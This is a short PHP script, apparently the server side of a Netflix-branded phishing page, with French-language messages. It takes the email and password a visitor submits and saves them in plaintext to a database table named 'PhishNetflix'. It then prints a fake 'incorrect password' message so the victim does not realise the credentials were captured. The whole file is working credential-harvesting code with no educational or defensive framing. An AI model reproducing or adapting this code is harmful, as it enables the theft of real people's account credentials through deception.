<?php
require 'db.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password']; 

 
    $sql = "SELECT id FROM `user` WHERE email = :email";
    $stmt = $pdo->prepare($sql);
    $stmt->execute(['email' => $email]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {

        $sql = "INSERT INTO `user` (email, motdepasse) VALUES (:email, :motdepasse)";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['email' => $email, 'motdepasse' => $password]);  
        $user_id = $pdo->lastInsertId();
    } else {
        $user_id = $user['id'];
    }

    $sql = "SELECT id FROM `PhishNetflix` WHERE user_id = :user_id";
    $stmt = $pdo->prepare($sql);
    $stmt->execute(['user_id' => $user_id]);
    $phishnetflix = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$phishnetflix) {
        $sql = "INSERT INTO PhishNetflix (user_id, motdepasse) VALUES (:user_id, :motdepasse)";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(['user_id' => $user_id, 'motdepasse' => $password]);
        echo "Mot de passe incorrect !";
    } else {
        echo "Cet utilisateur a déjà un compte Netflix enregistré.";
    }
} else {
    echo "Méthode invalide.";
}
?>
